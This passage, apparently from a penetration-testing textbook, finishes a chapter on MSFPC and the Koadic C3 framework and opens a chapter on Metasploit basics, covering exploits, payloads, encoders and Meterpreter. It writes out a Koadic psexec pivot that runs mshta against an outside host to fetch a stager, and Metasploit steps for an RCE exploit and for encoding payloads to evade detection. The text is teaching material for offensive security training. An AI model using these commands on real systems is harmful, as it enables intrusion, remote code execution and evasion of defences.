> idea here is to access the RPC server to execute remote commands to
> execute our given stager command, which will get us the reverse
> connection over MSHTA. For this, we can use the exec_psexec implant
> and set the cmd to
>
> mshta http://192.168.10.122:9999/fGLYN, which will execute our stager
> command on the given internal system:
>
> ![](media/image114.jpeg)**use implant/pivot/exec_psexec info**
>
> **set cmd \"mshta http://192.168.10.122:9999/fGLYN\"**
We also need to give the credentials for it:
> **set smbuser administrator**
>
> **set smbpass 123456**
>
> **set zombie 1**
>
> ![](media/image115.jpeg)
The implant is ready to run, so let\'s run it:
> ![](media/image116.jpeg)**Run**
As you can see from the preceding output, when we run the implant, it
executed our given CMD to get hooked up by our stager.
> Checking on all the zombies, we can see clearly that we now have
> access to
130. as well:
> ![](media/image117.jpeg)
Using Koadic can be chaotic, depending upon the imagination of the user.
# Summary
> Let\'s quickly summarize what we have worked on until now. At the
> beginning of this chapter, you were introduced to **MSF Payload
> Creator** (**MSFPC**) and the steps to install MSFPC on the system. We
> looked at the use of resource files (.rc), which were generated by
> MSFPC besides the payload file. Different types of payload generation
> were presented, according to the scenario; that is, the type of shell
> dropped by the payload (cmd or msf), the type of payload connection
> used (bind versus reverse), the type of payload (staged or stageless),
> the communication method (tcp/http/https/find_ports), and the modes
> used for mass payload generation (batch mode or loop mode).
In the latter part of this chapter, you were introduced to Koadic, a C3
server, its installation and usage, and the stages for performing a
Koadic-style post- exploitation.
# Questions
1.  Why use MSFPC when you can use msfvenom?
2.  Should we expect new features in MSFPC?
3.  Where can we use the loop and batch modes in a real-world scenario?
4.  Is MSFPC already installed in Kali Linux?
5.  Why use Koadic when you can use Empire and Metasploit?
6.  There\'s not many modules (implants) in Koadic as compared to
    > metasploit or Empire. Why is that?
7.  What else can we use instead of these boring command-line tools?
# Further reading
> For more information on the topics discussed in this chapter, please
> visit the following links:
>
> **MSFvenom Payload Creator (MSFPC)**: 
> [https://null-byte.wonderhowto.com/how-to/simplify-payload-creation-with-msfpc-msfven
> om-payload-creator-0180240/](https://null-byte.wonderhowto.com/how-to/simplify-payload-creation-with-msfpc-msfvenom-payload-creator-0180240/)
>
> **MSFPC**: 
>
> **MSFvenom Payload Creator (MSFPC)**:
> [https://www.yeahhub.com/msfvenom-payl
> oad-creator-msfpc-installation-usage/](https://www.yeahhub.com/msfvenom-payload-creator-msfpc-installation-usage/)
>
> **Koadic**:
> [koadichttps://github.com/zerosum0x0/koadic](https://github.com/zerosum0x0/koadic)
>
> [https://null-byte.wonderhowto.com/how-to/use-koadic-command-control-remote-access-to
> olkit-for-windows-post-exploitation-0181742/](https://null-byte.wonderhowto.com/how-to/use-koadic-command-control-remote-access-toolkit-for-windows-post-exploitation-0181742/)
>
> **Penetration Testing Lab**: 
>
> **Hunting for Koadic -- a COM-based rootkit**:
> [https://countercept.com/our-thi
> nking/hunting-for-koadic-a-com-based-rootkit/](https://countercept.com/our-thinking/hunting-for-koadic-a-com-based-rootkit/)
>
> **Koadic: An Advanced Windows JScript/VBScript RAT!**:
> [http://pentestit](http://pentestit.com/koadic-advanced-windows-jscript-vbscript-rat/)
>
> [.com/koadic-advanced-windows-jscript-vbscript-rat/](http://pentestit.com/koadic-advanced-windows-jscript-vbscript-rat/)
>
> **Koadic, or COM Command & Control**:
> [https://www.peerlyst.com/posts/bsides
> lv-2017-koadic-c3-windows-com-command-and-control-framework-by-zerosum0x0-and-aleph\_](https://www.peerlyst.com/posts/bsideslv-2017-koadic-c3-windows-com-command-and-control-framework-by-zerosum0x0-and-aleph___naught-zerosum0x0)
>
> [naught-zerosum0x0](https://www.peerlyst.com/posts/bsideslv-2017-koadic-c3-windows-com-command-and-control-framework-by-zerosum0x0-and-aleph___naught-zerosum0x0)
# Foreplay - Metasploit Basics
> Metasploit is the first tool that comes to mind whenever we think
> about pentesting or exploitation. The Metasploit framework is a
> sub-project of the Metasploit project. This helps us by providing
> information about vulnerabilities, as well as helping us with
> penetration testing.
>
> Metasploit first came out in 2003. It was developed by H.D. Moore but
> was later ported to Ruby by 2007. By October 2009, Rapid 7 acquired
> the Metasploit project. After this, Rapid 7 added Metasploit Express
> and Metasploit Pro, commercial versions of the product, and then the
> evolution of the Metasploit framework began.
The Metasploit framework is still an open source framework that allows
us to write, test, and execute exploit code. It can also be considered a
collection of tools for pentesting and exploitation.
> In this chapter, we will cover the basics of installing and using the
> Metasploit framework along with Armitage.
In this chapter, we will cover the following topics:
> A quick tour of Metasploit Running Metasploit Armitage and team server
> Armitage with slack Armitage and Cortana scripts
# Technical requirements
> Metasploit Framework (MSF) Postgres (PGSQL)
>
> Oracle Java 1.7 or later Armitage
# Installing Metasploit
> Before proceeding with the usage, let\'s take a look at a quick
> installation guide. Windows and macOS already have installers
> available for Metasploit that are available here:
> 
>
> Installing on Linux is easy and can be done by using the following
> command: **curl https://raw.githubusercontent.com/rapid7/metasploit-
> omnibus/master/config/templates/metasploit-framework-
> wrappers/msfupdate.erb \> msfinstall && \\ chmod 755 msfinstall &&
> \\**
## ./msfinstall
> ![](media/image118.jpeg)
>
> []{#_bookmark56 .anchor}**Running Metasploit**
>
> Once the installation is done, running Metasploit is pretty simple. To
> do this, we type the following command in the Terminal: **msfconsole**
>
> ![](media/image119.jpeg)
After doing this, we should see that the Metasploit framework is up and
running.
> When the msfconsole is loaded for the first time, it asks and
> automatically creates a database using PostgreSQL for use. This
> database is used to store the data collected from our scans, exploits,
> and so on. Every week, new exploits and
>
> other modules get added to Metasploit, so it\'s best that we update it
> every fortnight. This can be done by using the following command:
> **msfupdate**
>
> ![](media/image120.jpeg)
>
> We now run the help command to see the different features and its
> usage. Let\'s go through the basic terminology of Metasploit.
# Auxiliaries
> The Metasploit framework is equipped with hundreds of auxiliaries that
> can be used to perform different tasks. These modules can be
> considered as small tools that do not exploit anything but aid us in
> the exploitation process. To view a list of all the auxiliaries, we
> can use the following command:
>
> **show auxiliary**
>
> ![](media/image121.jpeg)
>
> We will look at an example of running an auxiliary that runs a version
> scan on the SMB service and tells us the OS that is installed on the
> system we ran the auxiliary on. To choose the auxiliary, we type in
> the following command:
>
> **use auxiliary/scanner/smb/smb_ms17_101**
>
> We can see more information about what this auxiliary does by typing
> the following:
>
> ![](media/image122.jpeg)**show info**
>
> Now we can see the options to check all the requirements of this
> auxiliary by inputting the following:
>
> ![](media/image123.jpeg)**show options**
Here, we can see that this auxiliary requires the value of the remote
host of RHOSTS and the number of threads. This can be increased if we
plan to use this across a subnet. We set the value of RHOSTS by using
the following command:
> **set RHOSTS \**
>
> We then run the auxiliary and this will show us whether the system is
> vulnerable to Eternal Blue and Eternal Romance, as well as whether it
> is already
>
> backdoored:
>
> ![](media/image124.jpeg)
# Exploits
> When Metasploit starts up, it shows the count of the publicly
> available exploits that are already available in the framework An
> exploit can be considered as the piece of code that takes advantage of
> a vulnerability and gives us the desired output.
To view all the available exploits, we use the following command:
![](media/image125.jpeg)**show exploits**
> The preceding command will show a list of all the available exploits
> in the Metasploit Framework, along with path, disclosure date, its
> ranking, and even description. Using the exploit is similar to using
> an auxiliary. Let\'s look at an example of an RCE exploit that was
> found on the HP Data Protector.
>
> Metasploit allows us to search the modules as well, using the
> following command: **search \**
>
> ![](media/image126.jpeg)
>
> To use one of the modules, we type the following:
>
> **use exploit/windows/misc/hp_dataprotector_cmd_exec**
>
> ![](media/image127.jpeg)
>
> Once the exploit is loaded, we see the following options:
>
> ![](media/image128.jpeg)
>
> We set the IP of the RHOST using the set command:
>
> **set RHOST \**
And then we run it:
> ![](media/image60.png)*Running this exploit requires Metasploit to be
> run as root, as port 445 is considered a privileged port to which this
> exploit is bound.*
# Payloads
> A payload is a piece of code that is delivered to the target system or
> an application via an exploit to perform an act of our choice.
> Payloads can actually be divided into three main types: singles,
> stagers, and stages. These can be defined as follows:
>
> **Singles**: These payloads are standalone and are usually used to
> perform simple tasks, such as opening notepad.exe, adding a user, and
> so on.
>
> **Stagers**: This sets up a connection between the two systems, and
> then stages are downloaded by them to the victim\'s machine.
>
> **Stages**: These can be considered as a component of a payload, which
> provides different features and does not need to have a size limit. An
> example of this is Meterpreter.
>
> As well as these, the other types of payloads are as follows:
>
> **Inline (non-staged)**: This is a single exploit containing the full
> shellcode to perform a specific task.
>
> **Stager**: This works along with stage payloads to perform a specific
> task. The stager establishes a communication channel between the
> attacker and the victim and sends a stage payload to execute on the
> remote host.
>
> **Meterpreter**: This operates through DLL injection, is loaded in the
> memory, and leaves no traces on HDD.
>
> **PassiveX**: This uses ActiveX control to create a hidden instance of
> Internet Explorer. Using this, it communicates with the attacker via
> HTTP requests and responses.
>
> **NoNX**: This is used to bypass DEP protection.
>
> **Ord**: These are extremely small sized payloads that work on all
> versions of Windows. However, they are unstable and rely on ws2_32.dll
> to be loaded in the exploitation process.
>
> **IPv6**: This is built to work on IPv6 hosts.
>
> **Reflective DLL injection**: This was created by Stephen Fewer, and
> is a technique that consists of a stage payload being injected into a
> compromised host process running in-memory and never touching the host
> hard drive.
>
> To view a complete list of payloads, we can use the show payloads
> command:
>
> ![](media/image130.jpeg)
From the preceding command, we can see that we have different kinds of
payloads for all platforms. The most commonly used of these is as
follows: **meterpreter/reverse_tcp .**
However, in a red-team activity, this payload is not recommended. We
will read more about this in further chapters.
# Encoders
> Encoders are used to avoid detection of a payload when it gets
> delivered to the target system or application. To view a list of
> encoders in Metasploit, we can use the following command: **Show
> encoders**
>
> ![](media/image131.jpeg)
>
> The most well-known encoder is x86/shikata_ga_nai. This is a
> polymorphic XOR additive feedback encoder, which means that it
> generates a different output every time. It was the hardest to detect
> when it first came out, and it is still pretty
>
> handy when used with multiple iterations. However, iterations must be
> used carefully and always tested first as they may not work as
> expected, and after every iteration the size of the payload increases.
We will also look at some encoders in later chapters.
# Meterpreter
> Meterpreter can be considered an advanced dynamic payload that uses
> in- memory.
>
> The **Dynamic Linked Library** (**DLL**) injection stages at runtime.
> It also provides a client-side Ruby API that makes it extremely
> powerful. There are various advantages of using Meterpreter as a
> payload. Some of these are as follows:
>
> It resides in the memory and nothing is written to the disk.
>
> No new process is created as it can easily be injected into any other
> running processes of the system. However, there\'s a limitation to it.
> We can\'t inject multiple Meterpreter payloads in the same process.
>
> By default, all communication done by Meterpreter is encrypted.
>
> New features can be added by uploading the DLL via a client that is
> loaded in-memory and initialized.
In this section, we will cover the basics of Meterpreter. Once we get
Meterpreter on a system, the first command to look at is the help
command:
> ![](media/image132.jpeg)
>
> To get the current working directory, we can use the pwd command:
>
> ![](media/image133.jpeg)
>
> To list all the files in the directory, we use the ls command:
>
> ![](media/image134.jpeg)
>
> ![](media/image135.jpeg)If we want to exploit another system or
> perform any other action on msfconsole without killing the current
> Meterpreter session, we can use the background command to put the
> session in the background:
To see a list of all the Meterpreter sessions we have, we can use the
sessions
> command:
>
> ![](media/image136.jpeg)
>
> To interact with a Meterpreter session, we can use sessions -i \.
> To kill all sessions, we can use sessions -K.
>
> Similarly, we can use sessions -C \ to execute a command
> across all sessions: ![](media/image137.jpeg)
To list all the running processes on the system, we can use the ps
command:
> ![](media/image138.jpeg)
>
> Now we can view only x86 (32-bit) processes by typing the following
> command:
>
> **ps -A x86**
>
> To view only 64-bit processes, we can use this:
>
> **ps -A x64**
>
> Using Meterpreter, we can also migrate it to another process using the
> migrate command. When this command is run, Meterpreter first gets the
> PID from the user to which it has to migrate, and then it checks the
> architecture of the process and SeDebugPrivilege (used to get a handle
> of the process). Next, it fetches the payload that will be injected to
> the process and calls various windows APIs, such as OpenProcess(),